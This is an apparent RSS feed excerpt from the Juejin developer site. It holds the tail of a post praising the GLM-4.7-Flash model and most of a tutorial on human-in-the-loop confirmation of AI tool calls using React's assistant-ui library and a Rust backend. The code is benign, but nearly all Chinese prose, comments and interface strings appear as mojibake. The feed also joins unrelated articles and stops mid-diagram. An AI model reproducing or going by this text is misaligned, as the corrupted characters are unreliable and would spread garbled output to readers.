<li><strong>4-bité‡åŒ–ç‰ˆæœ¬</strong>ï¼šä¸€å¼ 16GBæ˜¾å­˜çš„æ˜¾å¡ï¼ˆæ¯”å¦‚4080ï¼‰å°±èƒ½è·‘èµ·æ¥ã€‚</li>
<li><strong>å…¨ç²¾åº¦ç‰ˆæœ¬</strong>ï¼šä¸¤å¼ 3090æˆ–è€…ä¸€å¼ A6000ä¹Ÿèƒ½æå®šã€‚</li>
</ul>
<p>å®ƒç›®å‰å·²ç»è·å¾—äº†vLLMã€Ollamaç­‰ä¸»æµæ¨ç†æ¡†æ¶çš„æ”¯æŒã€‚ä¹Ÿå°±æ˜¯å–æ¯å’–å•¡çš„åŠŸå¤«ï¼Œä½ å°±èƒ½åœ¨è‡ªå·±çš„ç»ˆç«¯é‡Œæ‹‰èµ·ä¸€ä¸ªæ€§èƒ½å¯¹æ ‡GPT-OSS-20Bï¼Œç”šè‡³åœ¨ç¼–ç¨‹èƒ½åŠ›ä¸Šè¿˜è¦æ›´å¼ºçš„ç§æœ‰æ¨¡å‹ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-20_21.41.58-1024x820.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-20_21.41.58-1024x820.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3b89681eb2c4a17968eda5705fd1821~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769521902&amp;x-signature=Cwy0%2FsgDnJjvjUNqQY8f9I1nTAo%3D" alt="iShot_2026-01-20_21.41.58" loading="lazy"/></a></p>
<h2 data-id="heading-3">æ€»ç»“ï¼šæ•ˆèƒ½ä¼˜å…ˆçš„æ–°æ—¶ä»£</h2>
<p>GLM-4.7-Flashçš„å‡ºç°ï¼Œæ ‡å¿—ç€å¤§æ¨¡å‹ä¹‹æˆ˜è¿›å…¥äº†ä¸€ä¸ªæ–°é˜¶æ®µã€‚æˆ‘ä»¬ä¸å†å•çº¯æ¯”æ‹¼è°çš„æ¨¡å‹å‚æ•°æ›´å¤§ã€è°çƒ§çš„æ˜¾å¡æ›´å¤šï¼Œè€Œæ˜¯å¼€å§‹æ¯”æ‹¼è°èƒ½åœ¨æœ‰é™çš„èµ„æºä¸‹ï¼ŒæŠŠæ¨¡å‹å‹æ¦¨å‡ºæ›´é«˜çš„æ™ºèƒ½æ°´å¹³ã€‚</p>
<p>å¯¹äºä¼ä¸šæ¥è¯´ï¼Œè¿™æ˜¯ä¸€å¼ é™ä½æ¨ç†æˆæœ¬çš„å¥½ç‰Œï¼›å¯¹äºå¼€å‘è€…ä¸ªäººæ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªèƒ½å¡è¿›ç¬”è®°æœ¬é‡Œçš„å¼ºåŠ›ç¼–ç¨‹åŠ©æ‰‹ã€‚</p>
<p>æ™ºè°±è¿™æ¬¡å¹¶æ²¡æœ‰é‡æ–°å‘æ˜è½®å­ï¼Œä½†å®ƒæŠŠè½®å­æ‰“ç£¨å¾—æ›´è½»ã€æ›´é¡ºæ»‘äº†ã€‚å¦‚æœä½ æ‰‹å¤´æ­£å¥½æœ‰é—²ç½®çš„ç®—åŠ›ï¼Œæˆ–è€…æ­£åœ¨å¯»æ‰¾ä¸€ä¸ªé«˜æ€§ä»·æ¯”çš„APIæ›¿ä»£æ–¹æ¡ˆï¼Œå»Hugging Faceä¸‹è½½æƒé‡ï¼Œæˆ–è€…å»å¼€æ”¾å¹³å°è¯•ä¸€è¯•ï¼Œå¤§æ¦‚ç‡ä¸ä¼šè®©ä½ å¤±æœ›ã€‚</p>
<p><strong>å¦‚æœä½ ä¹Ÿå¯¹æœ€æ–°çš„AIä¿¡æ¯æ„Ÿå…´è¶£æˆ–è€…æœ‰ç–‘é—® éƒ½å¯ä»¥åŠ å…¥æˆ‘çš„å¤§å®¶åº­ ç¬¬ä¸€æ—¶é—´åˆ†äº«æœ€æ–°AIèµ„è®¯ã€å·¥å…·ã€æ•™ç¨‹ã€æ–‡æ¡£ æ¬¢è¿ä½ çš„åŠ å…¥ï¼ï¼ï¼ğŸ˜‰ğŸ˜‰ğŸ˜‰</strong></p>
<p>å…¬ä¼—å·ï¼šå¢¨é£å¦‚é›ªå°ç«™</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è®© AI å­¦ä¼š"é—®ä¸€å˜´"ï¼šassistant-ui å‰ç«¯å·¥å…·çš„äººæœºäº¤äº’å®è·µ]]></title>    <link>https://juejin.cn/post/7597276695403626537</link>    <guid>https://juejin.cn/post/7597276695403626537</guid>    <pubDate>2026-01-20T14:02:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597276695403626537" data-draft-id="7597253913248841769" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è®© AI å­¦ä¼š&quot;é—®ä¸€å˜´&quot;ï¼šassistant-ui å‰ç«¯å·¥å…·çš„äººæœºäº¤äº’å®è·µ"/> <meta itemprop="keywords" content="å‰ç«¯,Rust,OpenAI"/> <meta itemprop="datePublished" content="2026-01-20T14:02:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çº¢å°˜æ•£ä»™"/> <meta itemprop="url" content="https://juejin.cn/user/334694205359901"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è®© AI å­¦ä¼š"é—®ä¸€å˜´"ï¼šassistant-ui å‰ç«¯å·¥å…·çš„äººæœºäº¤äº’å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/334694205359901/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çº¢å°˜æ•£ä»™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:02:05.000Z" title="Tue Jan 20 2026 14:02:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">è®© AI å­¦ä¼š"é—®ä¸€å˜´"ï¼šassistant-ui å‰ç«¯å·¥å…·çš„äººæœºäº¤äº’å®è·µ</h2>
<blockquote>
<p>ğŸ¤– å½“ AI åŠ©æ‰‹è¦å¸®ç”¨æˆ·æ‰§è¡Œæ•æ„Ÿæ“ä½œæ—¶ï¼Œæ€»ä¸èƒ½é—·å¤´å°±å¹²å§ï¼Ÿå¾—å…ˆé—®é—®äººå®¶ç¡®ä¸ç¡®è®¤å•Šï¼</p>
</blockquote>
<h3 data-id="heading-1">èƒŒæ™¯ï¼šä¸€ä¸ª"è½æ’"çš„ AI åŠ©æ‰‹</h3>
<p>æˆ‘åœ¨åšä¸€ä¸ªå·¥å•ç®¡ç†ç³»ç»Ÿï¼Œé‡Œé¢æœ‰ä¸ª AI åŠ©æ‰‹åŠŸèƒ½ã€‚ç”¨æˆ·å¯ä»¥è¯´"å¸®æˆ‘åˆ›å»ºä¸€ä¸ªå·¥å•ï¼Œæ•°é‡ 50"ï¼ŒAI å°±ä¼šè°ƒç”¨å·¥å…·åˆ›å»ºè®°å½•ã€‚</p>
<p>å¬èµ·æ¥å¾ˆç¾å¥½ï¼Œä½†é—®é¢˜æ¥äº†ï¼š</p>
<p><strong>AI å¤ª"è‡ªä¿¡"äº†ã€‚</strong></p>
<p>å®ƒæ”¶åˆ°æŒ‡ä»¤å°±ç›´æ¥æ‰§è¡Œï¼Œä¸‡ä¸€ç”¨æˆ·è¯´é”™äº†å‘¢ï¼Ÿä¸‡ä¸€ AI ç†è§£é”™äº†å‘¢ï¼Ÿ50 å˜æˆ 500ï¼Œé‚£å¯å°±éº»çƒ¦äº†ã€‚</p>
<p>æ‰€ä»¥æˆ‘éœ€è¦ä¸€ä¸ªæœºåˆ¶ï¼š<strong>AI è°ƒç”¨å·¥å…·å‰ï¼Œå…ˆè®©ç”¨æˆ·ç¡®è®¤ä¸€ä¸‹ã€‚</strong></p>
<pre><code class="hljs language-less" lang="less">ç”¨æˆ·: å¸®æˆ‘åˆ›å»ºä¸€ä¸ªå·¥å•ï¼Œæ•°é‡ <span class="hljs-number">50</span>

<span class="hljs-selector-tag">AI</span>: å¥½çš„ï¼Œæˆ‘æ¥å¸®ä½ åˆ›å»ºè®°å½•
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ ç¡®è®¤åˆ›å»ºè®°å½•             â”‚
    â”‚ åç§°: <span class="hljs-selector-tag">A</span> æ¬¾               â”‚
    â”‚ æ•°é‡: <span class="hljs-number">50</span>                 â”‚
    â”‚ <span class="hljs-selector-attr">[ç¡®è®¤]</span>  <span class="hljs-selector-attr">[å–æ¶ˆ]</span>           â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ç”¨æˆ·: *ç‚¹å‡»ç¡®è®¤*

<span class="hljs-selector-tag">AI</span>: âœ… å·²åˆ›å»ºè®°å½•ï¼š<span class="hljs-selector-tag">A</span> æ¬¾ <span class="hljs-selector-tag">x</span> <span class="hljs-number">50</span>
</code></pre>
<p>è¿™å°±æ˜¯æ‰€è°“çš„ <strong>Human-in-the-Loop</strong>ï¼ˆäººæœºåä½œï¼‰æ¨¡å¼ã€‚</p>
<h3 data-id="heading-2">æŠ€æœ¯é€‰å‹</h3>
<ul>
<li>å‰ç«¯ï¼šReact + <code>@assistant-ui/react</code></li>
<li>åç«¯ï¼šRust + Axum + Rigï¼ˆAI æ¡†æ¶ï¼‰</li>
<li>AIï¼šOpenAI GPT-4</li>
</ul>
<p><code>assistant-ui</code> æ˜¯ä¸€ä¸ªä¸“é—¨ä¸º AI èŠå¤©ç•Œé¢è®¾è®¡çš„ React ç»„ä»¶åº“ï¼Œå®ƒæœ‰ä¸ªå¾ˆæ£’çš„ç‰¹æ€§ï¼š<strong>å‰ç«¯å·¥å…·ï¼ˆFrontend Toolsï¼‰</strong>ã€‚</p>
<h3 data-id="heading-3">æ¶æ„æ¦‚è§ˆ</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph Frontend["å‰ç«¯ (React)"]
        Runtime[useChatRuntime]
        Tool[CreateRecordTool&lt;br/&gt;å‰ç«¯å·¥å…·]
        UI[ç¡®è®¤ UI]
        Runtime --&gt; Tool --&gt; UI
        UI --&gt;|resume| Tool
        Tool --&gt;|sendAutomatically| Runtime
    end

    subgraph Backend["åç«¯ (Rust)"]
        Handler[Chat Handler]
        FTool[FrontendTool&lt;br/&gt;å·¥å…·å®šä¹‰è½¬å‘]
        AI[AI Model]
        Handler --&gt; FTool --&gt; AI
    end

    Runtime &lt;--&gt;|HTTP| Handler
</code></pre>
<h3 data-id="heading-4">æ ¸å¿ƒæ¦‚å¿µï¼šå‰ç«¯å·¥å…· vs åç«¯å·¥å…·</h3>

























<table><thead><tr><th/><th>å‰ç«¯å·¥å…·</th><th>åç«¯å·¥å…·</th></tr></thead><tbody><tr><td>æ‰§è¡Œä½ç½®</td><td>æµè§ˆå™¨</td><td>æœåŠ¡å™¨</td></tr><tr><td>èƒ½å¦ä¸ç”¨æˆ·äº¤äº’</td><td>âœ… å¯ä»¥</td><td>âŒ ä¸è¡Œ</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>éœ€è¦ç¡®è®¤çš„æ“ä½œ</td><td>æŸ¥è¯¢ã€è®¡ç®—</td></tr></tbody></table>
<p>å‰ç«¯å·¥å…·çš„ç²¾é«“åœ¨äºï¼š<strong>å·¥å…·å®šä¹‰å‘ç»™ AIï¼Œä½†æ‰§è¡Œåœ¨å‰ç«¯</strong>ã€‚</p>
<p>AI çŸ¥é“æœ‰è¿™ä¸ªå·¥å…·å¯ä»¥ç”¨ï¼Œå½“å®ƒå†³å®šè°ƒç”¨æ—¶ï¼Œå‰ç«¯æ‹¦æˆªæ‰§è¡Œï¼Œå¯ä»¥å¼¹ä¸ªç¡®è®¤æ¡†ã€è®©ç”¨æˆ·å¡«ä¸ªè¡¨å•ï¼Œç”¨æˆ·æ“ä½œå®Œå†æŠŠç»“æœå‘Šè¯‰ AIã€‚</p>
<h3 data-id="heading-5">å®ç°æ­¥éª¤</h3>
<h4 data-id="heading-6">1. å®šä¹‰å·¥å…·å‚æ•°</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// schema.ts</span>
<span class="hljs-keyword">import</span> { z } <span class="hljs-keyword">from</span> <span class="hljs-string">"zod"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">CreateRecordSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"åç§°"</span>),
  <span class="hljs-attr">amount</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"æ•°é‡"</span>),
});
</code></pre>
<h4 data-id="heading-7">2. åˆ›å»ºå‰ç«¯å·¥å…·</h4>
<p>è¿™æ˜¯æœ€å…³é”®çš„éƒ¨åˆ†ï¼Œä½¿ç”¨ <code>makeAssistantTool</code>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { makeAssistantTool } <span class="hljs-keyword">from</span> <span class="hljs-string">"@assistant-ui/react"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">CreateRecordTool</span> = <span class="hljs-title function_">makeAssistantTool</span>({
  <span class="hljs-attr">toolName</span>: <span class="hljs-string">"create-record"</span>,
  <span class="hljs-attr">type</span>: <span class="hljs-string">"frontend"</span>,  <span class="hljs-comment">// ğŸ”‘ å…³é”®ï¼šæ ‡è®°ä¸ºå‰ç«¯å·¥å…·</span>
  <span class="hljs-attr">parameters</span>: <span class="hljs-title class_">CreateRecordSchema</span>,
  <span class="hljs-attr">description</span>: <span class="hljs-string">"åˆ›å»ºè®°å½•"</span>,

  <span class="hljs-comment">// execute åœ¨å‰ç«¯æ‰§è¡Œ</span>
  <span class="hljs-attr">execute</span>: <span class="hljs-keyword">async</span> (args, ctx) =&gt; {
    <span class="hljs-keyword">const</span> { human } = ctx;

    <span class="hljs-comment">// human() ä¼šæš‚åœæ‰§è¡Œï¼Œç­‰å¾…ç”¨æˆ·ç¡®è®¤</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">human</span>(<span class="hljs-string">"è¯·ç¡®è®¤åˆ›å»ºè®°å½•"</span>);

    <span class="hljs-keyword">if</span> (response === <span class="hljs-string">"confirmed"</span>) {
      <span class="hljs-comment">// è°ƒç”¨å®é™… API</span>
      <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">createRecord</span>(args);
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> };
    }
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span> };
  },

  <span class="hljs-comment">// render æ¸²æŸ“ç¡®è®¤ UI</span>
  <span class="hljs-attr">render</span>: <span class="hljs-function">(<span class="hljs-params">{ args, status, result, resume }</span>) =&gt;</span> {
    <span class="hljs-comment">// ç­‰å¾…ç¡®è®¤çŠ¶æ€</span>
    <span class="hljs-keyword">if</span> (status.<span class="hljs-property">type</span> === <span class="hljs-string">"requires-action"</span>) {
      <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"rounded-lg border p-4"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>ç¡®è®¤åˆ›å»ºè®°å½•<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>åç§°: {args.name} | æ•°é‡: {args.amount}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> resume("confirmed")}&gt;ç¡®è®¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> resume("cancelled")}&gt;å–æ¶ˆ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
      );
    }

    <span class="hljs-comment">// å®ŒæˆçŠ¶æ€</span>
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{result?.success ? "âœ…" : "âŒ"} å·²å¤„ç†<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  },
});
</code></pre>
<p><strong>æ ¸å¿ƒ API è§£é‡Šï¼š</strong></p>
<ul>
<li><code>human(message)</code>: æš‚åœæ‰§è¡Œï¼Œç­‰å¾…ç”¨æˆ·æ“ä½œ</li>
<li><code>resume(value)</code>: ç”¨æˆ·æ“ä½œåæ¢å¤æ‰§è¡Œï¼Œvalue ä¼šä½œä¸º <code>human()</code> çš„è¿”å›å€¼</li>
</ul>
<h4 data-id="heading-8">3. æ³¨å†Œå·¥å…·</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> processedToolCalls = <span class="hljs-title function_">useRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;());

  <span class="hljs-keyword">const</span> runtime = <span class="hljs-title function_">useChatRuntime</span>({
    <span class="hljs-attr">transport</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssistantChatTransport</span>({
      <span class="hljs-attr">api</span>: <span class="hljs-string">"/api/chat"</span>,
    }),
    <span class="hljs-comment">// å·¥å…·å®Œæˆåè‡ªåŠ¨å‘é€ç»“æœç»™åç«¯</span>
    <span class="hljs-attr">sendAutomaticallyWhen</span>: <span class="hljs-function">(<span class="hljs-params">options</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">lastAssistantMessageIsCompleteWithToolCalls</span>(options)) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      }
      <span class="hljs-keyword">const</span> lastMsg = options.<span class="hljs-property">messages</span>.<span class="hljs-title function_">at</span>(-<span class="hljs-number">1</span>);
      <span class="hljs-keyword">const</span> toolPart = lastMsg?.<span class="hljs-property">parts</span>.<span class="hljs-title function_">find</span>(
        <span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> p.<span class="hljs-property">type</span> === <span class="hljs-string">"tool-create-record"</span> &amp;&amp; p.<span class="hljs-property">state</span> === <span class="hljs-string">"output-available"</span>
      ) <span class="hljs-keyword">as</span> { <span class="hljs-attr">toolCallId</span>: <span class="hljs-built_in">string</span> } | <span class="hljs-literal">undefined</span>;

      <span class="hljs-keyword">if</span> (toolPart &amp;&amp; !processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">has</span>(toolPart.<span class="hljs-property">toolCallId</span>)) {
        processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">add</span>(toolPart.<span class="hljs-property">toolCallId</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
      }
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    },
  });

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">AssistantRuntimeProvider</span> <span class="hljs-attr">runtime</span>=<span class="hljs-string">{runtime}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Thread</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">CreateRecordTool</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">AssistantRuntimeProvider</span>&gt;</span></span>
  );
}
</code></pre>
<h4 data-id="heading-9">4. åç«¯æ¥æ”¶å·¥å…·å®šä¹‰</h4>
<p>å‰ç«¯ä¼šæŠŠå·¥å…·å®šä¹‰å‘ç»™åç«¯ï¼Œåç«¯éœ€è¦è½¬å‘ç»™ AIï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// Rust åç«¯</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">FrontendTool</span> {
    <span class="hljs-keyword">pub</span> name: <span class="hljs-type">String</span>,
    <span class="hljs-keyword">pub</span> description: <span class="hljs-type">String</span>,
    <span class="hljs-keyword">pub</span> parameters: Value,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">ToolDyn</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">FrontendTool</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> { <span class="hljs-keyword">self</span>.name.<span class="hljs-title function_ invoke__">clone</span>() }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">definition</span>(&amp;<span class="hljs-keyword">self</span>, _: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> ToolDefinition {
        ToolDefinition {
            name: <span class="hljs-keyword">self</span>.name.<span class="hljs-title function_ invoke__">clone</span>(),
            description: <span class="hljs-keyword">self</span>.description.<span class="hljs-title function_ invoke__">clone</span>(),
            parameters: <span class="hljs-keyword">self</span>.parameters.<span class="hljs-title function_ invoke__">clone</span>(),
        }
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">call</span>(&amp;<span class="hljs-keyword">self</span>, _: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">String</span>, ToolError&gt; {
        <span class="hljs-comment">// å‰ç«¯å·¥å…·ä¸åœ¨åç«¯æ‰§è¡Œï¼</span>
        <span class="hljs-title function_ invoke__">Err</span>(ToolError::<span class="hljs-title function_ invoke__">ToolCallError</span>(<span class="hljs-string">"Frontend tool"</span>.<span class="hljs-title function_ invoke__">into</span>()))
    }
}
</code></pre>
<h3 data-id="heading-10">å®Œæ•´æµç¨‹</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant ç”¨æˆ·
    participant å‰ç«¯
    participant åç«¯
    participant AI

    ç”¨æˆ·-&gt;&gt;å‰ç«¯: "åˆ›å»ºå·¥å•ï¼Œæ•°é‡ 50"
    å‰ç«¯-&gt;&gt;åç«¯: å‘é€æ¶ˆæ¯ + å·¥å…·å®šä¹‰
    åç«¯-&gt;&gt;AI: è½¬å‘
    AI-&gt;&gt;åç«¯: è°ƒç”¨ create-record
    åç«¯--&gt;&gt;å‰ç«¯: è¿”å›å·¥å…·è°ƒç”¨
    å‰ç«¯-&gt;&gt;å‰ç«¯: execute() â†’ human()
